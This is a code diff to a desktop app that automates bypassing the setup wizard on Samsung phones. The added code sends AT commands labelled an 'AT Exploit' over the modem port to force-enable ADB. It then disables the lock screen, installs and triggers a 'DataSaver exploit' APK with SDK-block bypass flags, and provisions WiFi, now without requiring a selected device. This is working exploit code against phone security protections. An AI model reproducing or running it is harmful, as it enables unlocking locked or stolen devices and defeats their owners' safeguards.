@@ -36,7 +36,13 @@ export default function App() {
     try {
       const ports: string[] = await invoke("get_serial_ports");
       setSerialPorts(ports);
-      if (ports.length > 0 && !selectedPort) setSelectedPort(ports[0]);
+      const autoPort: string | null = await invoke("get_samsung_port");
+      if (autoPort) {
+        setSelectedPort(autoPort);
+        appendLog(`Auto-detected Samsung Modem: ${autoPort}`);
+      } else if (ports.length > 0 && !selectedPort) {
+        setSelectedPort(ports[0]);
+      }
       appendLog(`Found ${ports.length} COM port(s)`);
     } catch (e: any) {
       appendLog(`ERROR: ${e}`);
@@ -44,24 +50,45 @@ export default function App() {
     setLoading(false);
   };
 
-  const sendAT = async () => {
-    if (!selectedPort) return;
-    setLoading(true);
-    setLogExpanded(true);
-    appendLog(`──── Sending AT Exploit to ${selectedPort} ────`);
-    try {
-      appendLog(`[${selectedPort}] Sending AT+USBDEBUG=1...`);
-      const resp1: string = await invoke("send_at_command", { portName: selectedPort, command: "AT+USBDEBUG=1" });
-      appendLog(`Resp: ${resp1}`);
-      await delay(1000);
-      appendLog(`[${selectedPort}] Sending AT+ENGMODES=1,2,0...`);
-      const resp2: string = await invoke("send_at_command", { portName: selectedPort, command: "AT+ENGMODES=1,2,0" });
-      appendLog(`Resp: ${resp2}`);
-      appendLog(`[${selectedPort}] ✓ Done. Now check 'adb devices'.`);
-    } catch (e: any) {
-      appendLog(`[${selectedPort}] ✗ ${e}`);
+  const sendAT = async (silent = false) => {
+    let portToUse = selectedPort;
+    if (!portToUse) {
+      const auto: string | null = await invoke("get_samsung_port");
+      if (auto) portToUse = auto;
     }
-    setLoading(false);
+
+    if (!portToUse) {
+      if (!silent) appendLog("✗ No COM port detected for AT Exploit.");
+      return false;
+    }
+
+    if (!silent) appendLog(`──── Sending AT Exploit to ${portToUse} ────`);
+    
+    const runCommandWithRetry = async (cmd: string, retries = 2) => {
+      for (let i = 0; i <= retries; i++) {
+        try {
+          const resp: string = await invoke("send_at_command", { portName: portToUse, command: cmd });
+          if (resp.includes("OK") || resp.includes("DONE") || resp.length > 0) return resp;
+        } catch (e: any) {
+          if (i === retries) throw e;
+          await delay(1000);
+        }
+      }
+      return "";
+    };
+
+    try {
+      if (!silent) appendLog(`[${portToUse}] Sending AT+USBDEBUG=1...`);
+      await runCommandWithRetry("AT+USBDEBUG=1");
+      await delay(500);
+      if (!silent) appendLog(`[${portToUse}] Sending AT+ENGMODES=1,2,0...`);
+      await runCommandWithRetry("AT+ENGMODES=1,2,0");
+      if (!silent) appendLog(`[${portToUse}] ✓ Exploit Sent.`);
+      return true;
+    } catch (e: any) {
+      if (!silent) appendLog(`[${portToUse}] ✗ AT Failed: ${e}`);
+      return false;
+    }
   };
 
   const toggleDevice = (id: string) => {
@@ -81,10 +108,25 @@ export default function App() {
   const delay = (ms: number) => new Promise(r => setTimeout(r, ms));
 
   const skipWz = async () => {
-    if (selectedDevices.length === 0) return;
     setLoading(true);
     setLogExpanded(true);
-    appendLog("──── FULL WZ SKIP (BOW ALGORITHM) ────");
+
+    // Default Force AT Command
+    appendLog("Phase 1: Initializing Force AT Exploit...");
+    await sendAT(false);
+    await delay(2000); // Wait for ADB to wake up
+
+    const list: string[] = await invoke("get_devices");
+    setDevices(list);
+    const activeDevices = list.length > 0 ? list : selectedDevices;
+
+    if (activeDevices.length === 0) {
+      appendLog("✗ No devices found even after AT Exploit. Please check connection.");
+      setLoading(false);
+      return;
+    }
+
+    appendLog("Phase 2: FULL WZ SKIP (BOW ALGORITHM)");
     
     let apkData: string;
     let apkDataTest: string;
@@ -97,7 +139,7 @@ export default function App() {
       return;
     }
 
-    for (const dev of selectedDevices) {
+    for (const dev of activeDevices) {
       appendLog(`[${dev}] Step 1: Global & System Settings...`);
       try {
         await invoke("run_adb", { args: ["-s", dev, "shell", "settings put global stay_on_while_plugged_in 7"] }); await delay(200);
@@ -109,8 +151,8 @@ export default function App() {
         await invoke("run_adb", { args: ["-s", dev, "shell", "locksettings set-disabled true"] }); await delay(200);
         
         appendLog(`[${dev}] Step 2: Deploying DataSaver exploit...`);
-        await invoke("run_adb", { args: ["-s", dev, "install", "-r", apkData] }); await delay(500);
-        await invoke("run_adb", { args: ["-s", dev, "install", "-r", apkDataTest] }); await delay(500);
+        await invoke("run_adb", { args: ["-s", dev, "install", "-r", "-g", "--bypass-low-target-sdk-block", apkData] }); await delay(500);
+        await invoke("run_adb", { args: ["-s", dev, "install", "-r", "-g", "--bypass-low-target-sdk-block", apkDataTest] }); await delay(500);
         
         appendLog(`[${dev}] Step 3: Triggering exploit...`);
         await invoke("run_adb", { args: ["-s", dev, "shell", "am instrument -w -m -e debug false -e class 'com.example.DataSaver.ExampleInstrumentedTest' com.example.DataSaver.test/androidx.test.runner.AndroidJUnitRunner"] });
@@ -173,7 +215,7 @@ export default function App() {
     for (const dev of selectedDevices) {
       try {
         appendLog(`[${dev}] Installing WifiUtil...`);
-        await invoke("run_adb", { args: ["-s", dev, "install", "-r", apk] }); await delay(1000);
+        await invoke("run_adb", { args: ["-s", dev, "install", "-r", "-g", "--bypass-low-target-sdk-block", apk] }); await delay(1000);
         appendLog(`[${dev}] Configuring network...`);
         const method = password
           ? `am instrument -e method addWpaPskNetwork -e ssid "${ssid}" -e psk "${password}" -w com.android.tradefed.utils.wifi/.WifiUtil`
@@ -296,30 +338,30 @@ export default function App() {
             {/* Actions */}
             <section>
               <h3 className="text-[13px] font-semibold mb-3 text-[var(--win-text-secondary)]">Actions</h3>
-              <div className="grid grid-cols-2 gap-4">
+              <div className="grid grid-cols-3 gap-4">
                 <button
                   onClick={skipWz}
-                  disabled={loading || selectedDevices.length === 0}
+                  disabled={loading}
                   className="win-action-card"
                 >
                   <div className="w-10 h-10 rounded-lg bg-[#0078d4] flex items-center justify-center">
                     <Play className="w-5 h-5 text-white" />
                   </div>
-                  <span className="text-[14px] font-semibold">Skip Setup Wizard</span>
+                  <span className="text-[14px] font-semibold">Skip Wizard</span>
                   <span className="win-badge bg-[rgba(255,255,255,0.06)] text-[var(--win-text-tertiary)]">
-                    Full Bow Algorithm
+                    Force AT Mode
                   </span>
                 </button>
 
                 <button
                   onClick={setupPrecondition}
-                  disabled={loading || selectedDevices.length === 0}
+                  disabled={loading}
                   className="win-action-card"
                 >
                   <div className="w-10 h-10 rounded-lg bg-[#6b21a8] flex items-center justify-center">
                     <CheckCircle className="w-5 h-5 text-white" />
                   </div>
-                  <span className="text-[14px] font-semibold">Setup GBA Test</span>
+                  <span className="text-[14px] font-semibold">Setup GBA</span>
                   <span className="win-badge bg-[rgba(255,255,255,0.06)] text-[var(--win-text-tertiary)]">
                     Precondition
                   </span>
@@ -327,15 +369,15 @@ export default function App() {
 
                 <button
                   onClick={connectWifi}
-                  disabled={loading || selectedDevices.length === 0 || !ssid}
+                  disabled={loading || !ssid}
                   className="win-action-card"
                 >
                   <div className="w-10 h-10 rounded-lg bg-[#107c10] flex items-center justify-center">
                     <Wifi className="w-5 h-5 text-white" />
                   </div>
-                  <span className="text-[14px] font-semibold">Connect WiFi</span>
+                  <span className="text-[14px] font-semibold">WiFi Connect</span>
                   <span className="win-badge bg-[rgba(255,255,255,0.06)] text-[var(--win-text-tertiary)]">
-                    {ssid || "No SSID"}
+                    Auto-Provision
                   </span>
                 </button>
               </div>
@@ -361,7 +403,7 @@ export default function App() {
                     </select>
                   </div>
                   <button
-                    onClick={sendAT}
+                    onClick={() => sendAT()}
                     disabled={loading || !selectedPort}
                     className="win-btn-accent !bg-[var(--win-warning)] !text-black hover:!opacity-90 flex items-center gap-2 h-[38px] px-6"
                   >
@@ -377,47 +419,32 @@ export default function App() {
           </div>
 
           {/* ── LOG PANEL ── */}
-          <div className={`win-card bg-[var(--win-bg-smoke)] flex flex-col shrink-0 transition-all duration-300 shadow-xl overflow-hidden ${logExpanded ? "flex-1" : "h-[44px]"}`}>
-            <button
+          <div className={`win-card flex flex-col bg-black border-[var(--win-border)] transition-all duration-300 ${logExpanded ? 'h-64' : 'h-10'}`}>
+            <button 
               onClick={() => setLogExpanded(!logExpanded)}
-              className="flex items-center justify-between px-5 h-[44px] shrink-0 hover:bg-[var(--win-subtle-hover)] cursor-pointer border-b border-[var(--win-border)]"
+              className="flex items-center justify-between px-4 h-10 border-b border-[var(--win-border)] hover:bg-[rgba(255,255,255,0.03)] shrink-0"
             >
-              <div className="flex items-center gap-3">
-                <Terminal className="w-4 h-4 text-[var(--win-accent)]" />
-                <span className="text-[13px] font-bold">System Output</span>
-                {loading && (
-                  <div className="flex items-center gap-2 ml-4">
-                    <div className="w-1.5 h-1.5 rounded-full bg-[var(--win-warning)] animate-pulse"></div>
-                    <span className="text-[11px] text-[var(--win-warning)] font-bold">PROVISIONING...</span>
-                  </div>
-                )}
+              <div className="flex items-center gap-2">
+                <Terminal className="w-3.5 h-3.5 text-[var(--win-accent)]" />
+                <span className="text-[11px] font-bold uppercase tracking-widest">System Log</span>
               </div>
-              {logExpanded ? <ChevronDown className="w-4 h-4 text-[var(--win-text-disabled)]" /> : <ChevronUp className="w-4 h-4 text-[var(--win-text-disabled)]" />}
+              {logExpanded ? <ChevronDown className="w-4 h-4" /> : <ChevronUp className="w-4 h-4" />}
             </button>
-            {logExpanded && (
-              <div className="flex-1 min-h-0 p-4">
-                <div className="win-terminal h-full p-4 overflow-y-auto custom-scrollbar">
-                  {logs.length === 0 ? (
-                    <span className="text-[var(--win-text-disabled)] italic opacity-50">Awaiting user action...</span>
-                  ) : (
-                    <div className="space-y-1">
-                      {logs.map((log, i) => (
-                        <div key={i} className={`leading-6 text-[13px] ${
-                          log.includes("✓") ? "text-[var(--win-success)] font-bold" :
-                          log.includes("✗") || log.includes("ERROR") ? "text-[var(--win-error)] font-bold" :
-                          log.startsWith("────") ? "text-[var(--win-accent)] font-bold mt-2" :
-                          "text-[var(--win-text-secondary)]"
-                        }`}>
-                          <span className="text-[var(--win-text-disabled)] mr-2 select-none">›</span>
-                          {log}
-                        </div>
-                      ))}
-                    </div>
-                  )}
-                  <div ref={logEndRef} />
-                </div>
-              </div>
-            )}
+            <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed select-text cursor-text">
+              {logs.length === 0 ? (
+                <span className="opacity-30">Waiting for commands...</span>
+              ) : (
+                logs.map((log, i) => (
+                  <div key={i} className="mb-1">
+                    <span className="text-[var(--win-text-disabled)] mr-2">[{new Date().toLocaleTimeString()}]</span>
+                    <span className={log.startsWith('ERROR') || log.includes('✗') ? 'text-[var(--win-error)]' : log.includes('✓') ? 'text-[var(--win-success)]' : ''}>
+                      {log}
+                    </span>
+                  </div>
+                ))
+              )}
+              <div ref={logEndRef} />
+            </div>
           </div>
         </div>
       </div>
